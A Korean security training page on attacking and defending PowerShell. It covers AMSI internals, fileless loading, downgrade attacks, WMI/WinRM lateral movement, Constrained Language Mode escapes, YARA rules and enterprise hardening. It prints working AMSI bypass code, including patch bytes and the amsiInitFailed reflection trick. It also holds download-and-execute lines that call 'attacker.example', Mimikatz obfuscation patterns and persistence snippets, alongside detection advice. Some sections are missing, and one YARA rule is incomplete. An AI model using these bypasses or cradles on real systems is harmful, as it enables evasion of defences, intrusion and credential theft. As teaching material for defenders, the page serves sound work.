#1. AMSI 내부 구조 — AmsiScanBuffer 완전 해부

🔍

비유: 공항 보안 검색대의 X-ray 스캐너

AMSI(Antimalware Scan Interface)는 Windows 10부터 도입된 스크립트 검사 인터페이스입니다. PowerShell, VBScript, JScript, .NET 등이 코드를 실행하기 직전에 해당 코드를 AV/EDR에 전달하여 검사받도록 강제합니다. 공항의 X-ray 스캐너처럼, 모든 스크립트는 이 검문소를 반드시 통과해야 합니다.

AMSI 아키텍처 개요

PowerShell 엔진 내부에서 스크립트가 어떤 경로를 거쳐 검사되는지 확인합니다.

┌──────────────────────────────────────────────────────┐
│                PowerShell.exe (호스트)                  │
│  ┌────────────────────────────────────────────────┐  │
│  │  스크립트 입력: "IEX (New-Object ...)"          │  │
│  └──────────────┬─────────────────────────────────┘  │
│                 ▼                                      │
│  ┌────────────────────────────────────────────────┐  │
│  │  System.Management.Automation.dll               │  │

AmsiScanBuffer 내부 흐름 (C 의사코드)

amsi.dll 내부의 AmsiScanBuffer 함수가 실제로 어떻게 동작하는지 역공학 기반 C 의사코드로 살펴봅니다.

// amsi.dll!AmsiScanBuffer 의사코드 (역공학 기반 재구성)
HRESULT AmsiScanBuffer(
HAMSICONTEXT amsiContext, // AmsiInitialize()로 생성된 컨텍스트
PVOID buffer, // 스캔할 데이터 버퍼 (스크립트 코드)
ULONG length, // 버퍼 길이
LPCWSTR contentName, // 콘텐츠 이름 식별자
HAMSISESSION amsiSession, // 세션 핸들
AMSI_RESULT *result // [OUT] 스캔 결과 포인터
) {
// ① 입력 파라미터 검증
if (!amsiContext || !buffer || !length || !result)
return E_INVALIDARG;
// ② 컨텍스트 시그니처 무결성 검증 ← 핵심!
if (amsiContext->Signature != 0x49534D41) // 'AMSI'
return E_INVALIDARG; // ← 시그니처 깨지면 즉시 반환!
// ③ 등록된 모든 AV 프로바이더에게 순차 스캔 요청
for each (provider in amsiContext->Providers) {
hr = provider->Scan(amsiSession, buffer, length, result);
if (*result >= AMSI_RESULT_DETECTED) // 32768
return S_OK; // 악성 탐지됨 → 실행 차단
}
*result = AMSI_RESULT_CLEAN; // 모든 프로바이더 통과
return S_OK;
}

HAMSICONTEXT 구조체 분석

PowerShell이 시작될 때 AmsiInitialize가 호출되어 AMSI 컨텍스트를 생성합니다. 이 구조체를 이해하면 우회 포인트가 선명해집니다.

// HAMSICONTEXT 내부 구조 (비공식 역공학 결과)
typedef struct _AMSI_CONTEXT {
DWORD Signature; // 'AMSI' (0x49534D41) ← 변조 대상 #1
PWCHAR AppName; // "PowerShell_C:\Windows\..."
DWORD ProviderCount; // 등록된 AV 프로바이더 수
IAntimalwareProvider* Providers[];
} AMSI_CONTEXT;
3가지 핵심 우회 포인트
  • • Signature 필드 변조: 0x49534D41 → 0x00000000 으로 변경하면 AmsiScanBuffer가 E_INVALIDARG 반환
  • • AmsiScanBuffer 함수 프롤로그 패치: 첫 6바이트를 mov eax, 0x80070057; ret로 덮어쓰기
  • • AmsiOpenSession 패치: 세션 생성 자체를 실패시켜 후속 스캔을 전부 무력화

AMSI 스캔 결과 코드 일람

안전 판정 (실행 허용)
AMSI_RESULT_CLEAN = 0 ✅
AMSI_RESULT_NOT_DETECTED = 1 ✅
위협 판정 (실행 차단)
AMSI_RESULT_BLOCKED_BY_ADMIN = 16384
AMSI_RESULT_DETECTED = 32768 🚫

#2. AMSI 우회 기법 분석 — 메모리 패치, 리플렉션, CLR 후킹

💉

비유: X-ray 스캐너의 렌즈를 가리기

AMSI 우회는 본질적으로 검사 기능 자체를 무력화하는 것입니다. 코드를 "안전하게" 만드는 게 아니라, 검사 장비의 렌즈를 가려서 아무것도 보지 못하게 만드는 기법입니다. 대표적인 3가지 접근법을 코드와 함께 살펴봅니다.

방법 1: AmsiScanBuffer 메모리 패치 (가장 대표적)

amsi.dll이 프로세스 메모리에 로드된 후, AmsiScanBuffer 함수의 시작 부분을 패치하여 항상 E_INVALIDARG를 반환하도록 합니다.

// C# 기반 AmsiScanBuffer 패치 원리 분석 (교육 목적)
using System;
using System.Runtime.InteropServices;
public class AmsiPatchAnalysis {
[DllImport("kernel32")]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
uint flNewProtect, out uint lpflOldProtect);
// Step 1: amsi.dll 핸들과 함수 주소 획득
IntPtr hAmsi = LoadLibrary("amsi.dll");
IntPtr pASB = GetProcAddress(hAmsi, "AmsiScanBuffer");
// Step 2: 메모리 보호 속성 변경 (PAGE_EXECUTE_READWRITE)
VirtualProtect(pASB, (UIntPtr)6, 0x40, out uint oldProtect);
// Step 3: 패치 바이트 작성
// x64: B8 57 00 07 80 = mov eax, 0x80070057 (E_INVALIDARG)
// C3 = ret
byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
Marshal.Copy(patch, 0, pASB, 6);
}
패치 바이트 해석 (x64)
B8 57 00 07 80 → mov eax, 0x80070057 (HRESULT: E_INVALIDARG)
C3 → ret (함수 즉시 종료, 스캔 수행하지 않음)

방법 2: .NET Reflection AmsiUtils 필드 변조

PowerShell 내부의 System.Management.Automation.AmsiUtils 클래스에는 AMSI 초기화 실패 플래그가 있습니다. 이 private static 필드를 리플렉션으로 true로 설정하면 스캔이 스킵됩니다.

# .NET Reflection 기반 AMSI 우회 원리
# amsiInitFailed = true → 모든 스캔 건너뛰기
$type = [Ref].Assembly.GetType(
'System.Management.Automation.AmsiUtils')
$field = $type.GetField(
'amsiInitFailed',
'NonPublic,Static')
$field.SetValue($null, $true)
# 효과: PowerShell이 AMSI 초기화가 실패한 것으로 인식
# → AmsiUtils.ScanContent()가 호출되지 않음

방법 3: CLR 후킹 — 함수 포인터 교체

.NET CLR 레벨에서 AmsiScanBuffer의 JIT 컴파일된 네이티브 코드 포인터를 자체 더미 함수로 교체하는 방식입니다.

// C# 의사코드: CLR 후킹 기반 AMSI 우회 원리
delegate int AmsiScanBufferDelegate(
IntPtr ctx, IntPtr buf, uint len,
IntPtr name, IntPtr session, out int result);
// 대체 함수: 항상 AMSI_RESULT_CLEAN(0) 반환
static int FakeAmsiScan(..., out int result) {
result = 0; // AMSI_RESULT_CLEAN
return 0; // S_OK
}

방어자 관점: AMSI 우회 탐지 전략

탐지 가능한 지표
  • • ETW Provider로 AmsiScanBuffer 호출 빈도 모니터링
  • • amsi.dll .text 섹션의 무결성 해시 주기적 검증
  • • Script Block Logging (EID 4104)에서 난독화 패턴 탐지
  • • VirtualProtect 호출 후 amsi.dll 주소 범위 쓰기 감시
탐지가 어려운 케이스
  • • 커널 모드에서의 AMSI 우회
  • • 프로세스 시작 직후 초기 패치 (Race Condition)
  • • 알려지지 않은 오프셋 변형 패치
  • • Hardware Breakpoint 기반 우회

#3. .NET Assembly 리플렉션 로딩 — 파일 없는 실행

🧬

비유: 책을 서점에 두지 않고 머릿속에만 담기

.NET 리플렉션 로딩은 악성 .NET 바이너리를 디스크에 저장하지 않고 메모리에 직접 로드하여 실행하는 기법입니다. AV가 디스크를 아무리 스캔해봐야 아무것도 없습니다 — 모든 것이 프로세스 메모리 안에만 존재합니다.

Assembly::Load() 완전 분석

PowerShell에서 .NET Assembly를 메모리에 로드하는 핵심 메서드입니다. 바이트 배열을 인자로 받아 파일 I/O 없이 실행합니다.

# .NET Assembly 메모리 로딩 — 공격 체인 분석
# Step 1: 원격 서버에서 Assembly 바이트 다운로드
$wc = New-Object System.Net.WebClient
$bytes = $wc.DownloadData("https://attacker.example/payload.exe")
# Step 2: 메모리에 Assembly 로드 (디스크 터치 없음!)
$asm = [System.Reflection.Assembly]::Load($bytes)
# Step 3: Entry Point 찾아서 실행
$ep = $asm.EntryPoint
$ep.Invoke($null, @(,([string[]]@())))
# 결과: payload.exe가 디스크 기록 없이 메모리에서만 실행
# AV 파일 스캔 완전 우회, 포렌식 시 디스크에서 흔적 없음

실전 도구 분석: Invoke-Mimikatz 내부 동작

유명한 Invoke-Mimikatz.ps1은 이 기법의 대표 사례입니다. Mimikatz PE 바이너리가 Base64로 스크립트 내에 인코딩되어 있고, Reflective PE Injection으로 메모리 로딩됩니다.

# Invoke-Mimikatz 내부 동작 흐름 (교육용 간소화)
# 1. Base64 인코딩된 PE 바이너리
$PEBytes64 = "TVqQAAMAAAAEAAAA//8AALgA..." # ~1.2MB
# 2. 디코딩 → 바이트 배열
$PEBytes = [Convert]::FromBase64String($PEBytes64)
# 3. Reflective PE Injection
# → VirtualAlloc → 섹션 복사 → IAT 패치 → 재배치 → EP 호출
Invoke-ReflectivePEInjection -PEBytes $PEBytes

#4. PowerShell 다운그레이드 공격 — v2.0의 유산

⏪

비유: 최신 잠금장치를 무시하고 구형 자물쇠 사용

PowerShell 2.0에는 AMSI, Script Block Logging, Constrained Language Mode가 모두 존재하지 않습니다. 공격자가 powershell.exe -Version 2로 구버전을 강제 실행하면, 최신 보안 기능이 전부 무력화됩니다.

다운그레이드 공격 실행과 검증

# 다운그레이드 공격 실행
C:\> powershell.exe -Version 2 -NoProfile -NonInteractive
# 버전 확인
PS> $PSVersionTable.PSVersion
Major Minor Build Revision
----- ----- ----- --------
2 0 -1 -1
# AMSI 테스트 — v2.0에서는 탐지되지 않음!
PS> "Invoke-Mimikatz" # v5.0+에서는 AMSI가 차단
Invoke-Mimikatz
# 아무 경고 없이 출력

전제 조건과 방어

필요 조건
  • • .NET Framework 2.0 설치 필수
  • • Windows 10 1803 이전에는 기본 설치됨
  • • Server 2016/2019에서도 옵션 설치 가능
방어 전략
  • • .NET Framework 2.0/3.5 완전 제거
  • • AppLocker로 PowerShell v2 실행 차단
  • • Event ID 400 EngineVersion=2.0 모니터링

탐지 규칙: Windows Event Log

# Windows PowerShell 로그 → Event ID 400
Log: Windows PowerShell

EngineVersion=2.0.50727.9168 ← 2.0이면 경고!

PS> Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2

PowerShell 난독화 기법 심층 분석

다운그레이드 공격과 함께, 공격자는 난독화(Obfuscation) 기법을 결합하여 탐지를 회피합니다. 다음은 실무에서 자주 관찰되는 대표적 난독화 패턴입니다.

# ── 난독화 유형 1: 문자열 연결(Concatenation) ──
$cmd = "Inv"+"oke-"+"Mim"+"ika"+"tz"
IEX $cmd
# ── 난독화 유형 2: Tick(`) 삽입 ──
I`n`v`o`k`e-M`i`m`i`k`a`t`z
# ── 난독화 유형 3: -replace를 이용한 치환 ──
$x = "AAAA-BBBB" -replace "AAAA","Invoke" `
-replace "BBBB","Mimikatz"
# ── 난독화 유형 4: 환경 변수 + 인덱싱 ──
# $env:ComSpec = "C:\Windows\system32\cmd.exe"
$env:ComSpec[4,15,25] -join '' # → "iex"
# ── 난독화 유형 5: SecureString 역변환 ──
$ss = ConvertTo-SecureString "IEX(payload)" `
-AsPlainText -Force
$ptr = [Runtime.InteropServices.Marshal]::SecureStringToGlobalAllocUnicode($ss)
$plain = [Runtime.InteropServices.Marshal]::PtrToStringUni($ptr)
IEX $plain
# ── 난독화 유형 6: -f 포맷 연산자 ──
$x = "{2}{0}{1}" -f "ke-Mimi","katz","Invo"
IEX $x

난독화 탐지 전략 매트릭스

난독화 유형 탐지 방법 탐지 도구
문자열 연결 EID 4104 디코딩 후 원본 복원 Revoke-Obfuscation
Tick 삽입 정규식 패턴 매칭 (backtick 제거) Sigma + 정규식
Base64 인코딩 -enc 플래그 + UTF-16LE 디코딩 YARA + CyberChef
환경변수 인덱싱 Script Block Log에서 최종 실행 코드 확인 EID 4104 (디코딩됨)
-f 포맷 연산자 AST 분석으로 포맷 문자열 재조합 PowerShell AST Parser
SecureString 역변환 Marshal 클래스 호출 패턴 탐지 Sigma + YARA
핵심 포인트: Script Block Logging(EID 4104)은 PowerShell이 실행 직전에 디코딩한 최종 코드를 기록합니다. 즉, 아무리 복잡한 난독화를 적용하더라도 EID 4104에는 원본 코드가 남습니다. 이것이 Script Block Logging이 가장 중요한 방어 기제인 이유입니다.

#5. WMI/CIM 연계 원격 실행 — 횡적 이동의 핵심

🌐

비유: 내부 전화망으로 원격 명령 내리기

WMI(Windows Management Instrumentation)는 Windows의 관리 인프라입니다. 공격자는 이를 악용하여 다른 시스템에서 PowerShell을 원격 실행하며 횡적 이동을 수행합니다. RDP나 PsExec보다 탐지가 훨씬 어렵습니다.

원격 실행 기법 3가지

# 방법 1: Invoke-WmiMethod + Win32_Process::Create
Invoke-WmiMethod -Class Win32_Process -Name Create `
-ArgumentList "powershell.exe -enc JABjAD0..." `
-ComputerName "TARGET-PC" -Credential $cred
# 방법 2: CIM (최신 대체) — WinRM 기반
$s = New-CimSession -ComputerName "TARGET-PC" -Credential $cred
Invoke-CimMethod -CimSession $s -ClassName Win32_Process `
-MethodName Create -Arguments @{
CommandLine="powershell.exe -NoP -W Hidden -enc ..."}
# 방법 3: WMI 이벤트 구독 (영구 백도어)
$filter = Set-WmiInstance -Namespace root\subscription `
-Class __EventFilter -Arguments @{
Name = "PersistFilter"
QueryLanguage = "WQL"
Query = "SELECT * FROM __InstanceModificationEvent
WITHIN 60 WHERE TargetInstance ISA
'Win32_PerfFormattedData_PerfOS_System'"}

탐지 포인트 요약

네트워크 레벨
  • • DCOM: TCP 135 + 동적 포트
  • • WinRM: TCP 5985/5986
  • • 비정상 SMB 트래픽
호스트 로그
  • • Sysmon EID 1 (프로세스 생성)
  • • WMI-Activity EID 5861
  • • PowerShell Operational Log
WMI 영구 구독
  • • __EventFilter 열거
  • • FilterToConsumerBinding
  • • 정기 점검 스크립트 필수

PowerShell Remoting (WinRM) 기반 원격 실행

WMI 외에도 PowerShell Remoting(WinRM)은 공격자가 자주 사용하는 원격 실행 채널입니다. Enter-PSSession과 Invoke-Command로 원격 시스템에서 임의의 PowerShell 코드를 실행할 수 있습니다.

# PowerShell Remoting 기반 원격 코드 실행
# 방법 1: 인터랙티브 원격 세션
$cred = Get-Credential
Enter-PSSession -ComputerName "TARGET-DC01" `
-Credential $cred
# 방법 2: 다수 호스트에 동시 명령 실행
$targets = @("WEB01", "DB01", "APP01")
Invoke-Command -ComputerName $targets `
-Credential $cred `
-ScriptBlock {
# 이 블록은 원격 시스템에서 실행됨
Get-Process | Where-Object {$_.ProcessName -eq "lsass"}
}
# 방법 3: 파일 없는 공격 — 메모리에서만 실행
Invoke-Command -ComputerName "TARGET-DC01" `
-ScriptBlock {
IEX (New-Object Net.WebClient).DownloadString(
"https://attacker.example/payload.ps1")
} -Credential $cred

WMI vs WinRM 비교

특성 WMI (DCOM) WinRM (PSRemoting)
프로토콜 DCOM (TCP 135 + 동적) HTTP/HTTPS (TCP 5985/5986)
출력 반환 제한적 (프로세스 생성만) 완전한 객체 반환
지속성 이벤트 구독으로 영구 백도어 가능 세션 기반 (연결 유지 필요)
탐지 난이도 높음 (정상 관리 트래픽과 유사) 중간 (로깅 잘 됨)
암호화 기본 미암호화 기본 암호화 (Kerberos/NTLM)

#6. Constrained Language Mode 우회 — 샌드박스 탈출

🔓

비유: 어린이 놀이터 울타리 넘기

CLM은 PowerShell의 기능을 크게 제한합니다. .NET 타입 사용, COM 객체 생성, Win32 API P/Invoke가 모두 차단됩니다. 하지만 공격자는 새 Runspace 생성이나 AppLocker 허용 경로를 악용하여 이 제한을 우회합니다.

CLM 상태 확인과 제한 목록

# Language Mode 확인
PS> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
# CLM에서 차단되는 작업들:
PS> [System.IO.File]::ReadAllText("C:\secret.txt")
Cannot invoke method. Method invocation is supported only
on core types in this language mode.
PS> Add-Type -TypeDefinition "public class Test{}"
Cannot add type. Only core types are supported.
PS> New-Object -ComObject WScript.Shell
Cannot create type. Only core types are supported.

우회 방법 1: 새 Runspace 생성

CLM은 현재 Runspace에만 적용됩니다. C# 코드로 새 Runspace를 생성하면 FullLanguage 모드로 실행할 수 있습니다.

// C#: 새 Runspace 생성으로 CLM 우회
using System.Management.Automation;
using System.Management.Automation.Runspaces;
var rs = RunspaceFactory.CreateRunspace();
rs.Open(); // FullLanguage 모드 Runspace!
var pipe = rs.CreatePipeline();
pipe.Commands.AddScript(
"[System.IO.File]::ReadAllText('C:\\secret.txt')");
var results = pipe.Invoke(); // 성공!

우회 방법 2: AppLocker 허용 경로 악용

CLM은 보통 AppLocker와 연동됩니다. AppLocker 기본 규칙이 허용하는 경로 중 쓰기가 가능한 디렉토리가 존재합니다.

# AppLocker 기본 허용 경로 중 쓰기 가능한 위치
C:\Windows\Tasks\ ← 사용자 쓰기 가능
C:\Windows\Temp\ ← 사용자 쓰기 가능
C:\Windows\Tracing\ ← 사용자 쓰기 가능
C:\Windows\Registration\ ← COMPlus 경로
# 악성 스크립트를 허용 경로에 저장 후 실행 → CLM 우회
PS> Copy-Item evil.ps1 C:\Windows\Tasks\
PS> & C:\Windows\Tasks\evil.ps1 # FullLanguage!

방어 권장사항

AppLocker 강화
  • • 기본 규칙 대신 명시적 허용 목록 사용
  • • 쓰기 가능 경로의 스크립트 실행 명시적 차단
  • • Publisher 규칙으로 서명된 스크립트만 허용
WDAC (Windows Defender Application Control)
  • • AppLocker보다 강력한 커널 레벨 정책
  • • Runspace 우회에도 효과적
  • • 코드 무결성 정책 적용

#9. YARA 규칙 개발 — 난독화된 PowerShell 탐지

📐

비유: 범인의 필체를 분석하는 감식 전문가

YARA는 바이너리 패턴 매칭 도구로, 파일이나 메모리에서 특정 바이트 시퀀스나 문자열 패턴을 탐지합니다. PowerShell 공격에서는 난독화된 페이로드의 공통 패턴을 규칙으로 정의하여 탐지합니다.

YARA 규칙 1: Base64 인코딩된 PowerShell 탐지

rule
Detect_Base64_PowerShell {
meta:
description = "Base64로 인코딩된 PowerShell 명령 탐지"
author = "ROOT14 EDU"
severity = "high"
strings:
// "powershell" Base64 변형들
$b64_ps1 = "cABvAHcAZQByAHMAaABlAGwAbA" // UTF-16LE Base64
$b64_ps2 = "UABvAHcAZQByAFMAaABlAGwAbA"
// "-enc" 또는 "-EncodedCommand" 패턴
$enc_flag = /\-[eE]([nN][cC]|ncodedcommand)/
// IEX 패턴 (실행 트리거)
$iex1 = "IEX" nocase
$iex2 = "Invoke-Expression" nocase
condition:
($b64_ps1 or $b64_ps2) and ($enc_flag or $iex1 or $iex2)
}

YARA 규칙 2: AMSI 우회 코드 탐지

rule
Detect_AMSI_Bypass {
meta:
description = "AMSI 우회 시도 탐지"
severity = "critical"
strings:
// AmsiScanBuffer 패치 바이트 시퀀스
$patch_bytes = { B8 57 00 07 80 C3 }
// .NET Reflection 기반 우회 문자열
$ref1 = "AmsiUtils" nocase
$ref2 = "amsiInitFailed" nocase
$ref3 = "AmsiScanBuffer"
// VirtualProtect + amsi 조합
$vp = "VirtualProtect"
$amsi = "amsi.dll" nocase
condition:
$patch_bytes or ($ref1 and $ref2) or ($vp and $amsi and $ref3)
}

YARA 규칙 3: .NET Assembly 메모리 로딩 탐지

rule
Detect_Reflective_Assembly_Load {
meta:
description = "Reflective .NET Assembly 로딩 탐지"
strings:
$load1 = "[Reflection.Assembly]::Load" nocase
$load2 = "System.Reflection.Assembly"
$b64 = "FromBase64String"
$wc = "DownloadData"

($load1 or $load2) and ($b64 or $wc or $pe_header)
}

#11. 엔터프라이즈 방어 — JEA, PowerShell v7, Zero Trust

🏢

비유: 군사 기지의 다층 방어 체계

개별 우회 기법을 막는 것만으로는 불충분합니다. 엔터프라이즈 환경에서는 JEA(Just Enough Administration), PowerShell v7 보안 기능, Zero Trust 아키텍처를 결합한 다층 방어가 필요합니다.

JEA (Just Enough Administration) 구성

JEA는 PowerShell 원격 세션에서 사용자가 실행할 수 있는 명령을 화이트리스트로 제한합니다. 관리자라도 허용된 cmdlet만 사용할 수 있습니다.

# JEA Role Capability 파일 (.psrc) 예시
@{
# 허용된 명령만 정의
VisibleCmdlets = @(
'Get-Service',
'Restart-Service',
'Get-Process'
)
# 차단: Invoke-Expression, Add-Type, New-Object 등
VisibleExternalCommands = @() # 외부 명령 차단
LanguageMode = 'NoLanguage' # 스크립팅 완전 차단
}

PowerShell v7+ 보안 강화 기능

새로운 보안 기능
  • • SSH 기반 원격 (WinRM 대체)
  • • 개선된 로깅 (Operational Log 확장)
  • • WDAC 완전 지원
  • • SecretManagement 모듈 (자격증명 보호)
GPO 필수 설정
  • • Script Block Logging: 활성화
  • • Module Logging: 활성화
  • • Transcription: 활성화
  • • ExecutionPolicy: AllSigned

Red Team vs Blue Team 시나리오

실제 공격과 방어 시나리오를 통해, 각 보안 기능이 어떻게 공격을 차단하는지 확인합니다.

🔴 Red Team 공격 체인
Step 1 피싱 이메일의 악성 매크로가 PowerShell 실행
powershell -NoP -W Hidden -enc JABj...
Step 2 AMSI 우회: amsiInitFailed = true
[Ref].Assembly...amsiInitFailed = $true
Step 3 C2 서버에서 Mimikatz 메모리 로딩
Assembly::Load(DownloadData(url))
Step 4 자격증명 덤프 후 WMI로 측면 이동
Invoke-WmiMethod -ComputerName DC01
🔵 Blue Team 방어 대응
Block 1 Sysmon EID 1 → 의심 커맨드라인 탐지
Sigma 규칙 2가 즉시 알림 발생
Block 2 EID 4104 Script Block Logging이 우회 코드 기록
Sigma 규칙 3이 AMSI 우회 탐지
Block 3 WDAC가 서명되지 않은 Assembly 로딩 차단
CLM이 Reflection API 호출 제한
Block 4 JEA가 WMI 명령 차단 + 네트워크 세그멘테이션
Sysmon EID 3이 비정상 연결 탐지
Purple Team 결론: 다층 방어를 구축하면, 공격자가 한 레이어를 우회해도 다음 레이어에서 탐지/차단됩니다. 완벽한 단일 방어는 존재하지 않지만, 깊이 있는 방어(Defense in Depth)는 공격 비용을 기하급수적으로 높입니다.

WDAC 정책 배포 실습 가이드

AppLocker보다 강력한 WDAC(Windows Defender Application Control) 정책을 GPO로 배포하는 단계별 절차입니다.

# Step 1: 감사 모드(Audit) 정책 생성
$Policy = New-CIPolicy -Level Publisher `
-Fallback Hash -FilePath "C:\WDAC\AuditPolicy.xml" `
-UserPEs -Audit
# Step 2: Intelligent Security Graph (ISG) 추가
Set-RuleOption -FilePath "C:\WDAC\AuditPolicy.xml" `
-Option 14 # Enable ISG Authorization
# Step 3: XML → Binary 변환
ConvertFrom-CIPolicy -XmlFilePath "C:\WDAC\AuditPolicy.xml" `
-BinaryFilePath "C:\WDAC\AuditPolicy.p7b"
# Step 4: GPO로 배포 (Computer Configuration → Policies →
# Administrative Templates → System → Device Guard →
# Deploy Windows Defender Application Control)
# Step 5: 감사 로그 확인 후 차단 모드로 전환
Set-RuleOption -FilePath "C:\WDAC\AuditPolicy.xml" `
-Option 3 -Delete # Audit Mode 옵션 제거 → 차단 모드
